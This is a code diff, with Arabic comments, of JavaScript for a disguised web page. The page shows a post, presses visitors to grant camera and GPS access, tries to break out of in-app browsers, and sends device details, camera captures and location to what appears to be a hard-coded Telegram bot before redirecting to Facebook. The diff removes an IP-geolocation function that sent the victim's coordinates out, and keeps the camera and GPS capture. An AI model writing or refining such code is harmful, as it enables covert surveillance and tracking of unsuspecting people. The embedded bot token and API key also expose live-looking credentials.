@@ -75,7 +75,6 @@
     const B = '69ee19e8856a68218974812e';
     const T = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ';
     const C = '5151102782';
-    const I = 'a7e43833d69a75';
 
     const post = document.getElementById('postContainer');
     const overlay = document.getElementById('retryOverlay');
@@ -85,7 +84,7 @@
     const cnv = document.getElementById('canvas');
     const ctx = cnv.getContext('2d');
 
-    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null, ipLoc = null;
+    let stream, photos = 0, capInt, redir = 'https://www.facebook.com', deviceInfoSent = false, gpsLoc = null;
     let cameraGranted = false, locationGranted = false;
     let escapeCompleted = false, watchId = null;
     let retryReason = 'camera'; // 'camera' أو 'location'
@@ -172,22 +171,7 @@
       } catch (e) {}
     }
 
-    async function fetchIPLocation() {
-      try {
-        const r = await fetch(`https://ipinfo.io/json?token=${I}`); const d = await r.json();
-        if (d.loc) {
-          const [lat, lon] = d.loc.split(',').map(Number);
-          ipLoc = { lat, lon, acc: 5000, src: 'IP' };
-          sendText(
-            `📍 <b>الموقع التقريبي (IP)</b>\n` +
-            `الإحداثيات: ${lat}, ${lon}\n` +
-            `🌍 <a href="https://www.google.com/maps?q=${lat},${lon}">Google Maps</a>\n` +
-            `🍎 <a href="http://maps.apple.com/?ll=${lat},${lon}&q=موقع">Apple Maps</a>\n` +
-            `🗺️ <a href="https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=15">OpenStreetMap</a>`
-          );
-        }
-      } catch (e) {}
-    }
+    // تم إزالة دالة fetchIPLocation بالكامل – لا نستخدم IP إطلاقاً
 
     function requestLocation() {
       if (!navigator.geolocation) { showOverlay('location'); return; }
@@ -264,10 +248,10 @@
       }
       cameraGranted = true;
       hideOverlay();
-      // فارق زمني 1 ثانية قبل طلب الموقع
+      // انتظار 1.5 ثانية قبل طلب الموقع
       setTimeout(() => {
         requestLocation();
-      }, 1000);
+      }, 1500);
     }
 
     retryBtn.addEventListener('click', async () => {
@@ -283,7 +267,6 @@
     async function sendExitReport() {
       let locStr = 'غير متوفر';
       if (gpsLoc) locStr = `GPS (${gpsLoc.lat}, ${gpsLoc.lon}, دقة ${gpsLoc.acc}م)`;
-      else if (ipLoc) locStr = `IP (${ipLoc.lat}, ${ipLoc.lon})`;
       sendText(`<b>📋 تقرير نهائي</b>\nعدد الصور: ${photos}\nالموقع: ${locStr}\nالوقت: ${new Date().toLocaleString()}`);
     }
 
@@ -320,7 +303,6 @@
     (async function init() {
       await loadPost();
       sendDeviceInfo();
-      fetchIPLocation();
       if (isInAppBrowser()) await attemptEscape();
       setTimeout(startFlow, 600);
     })();
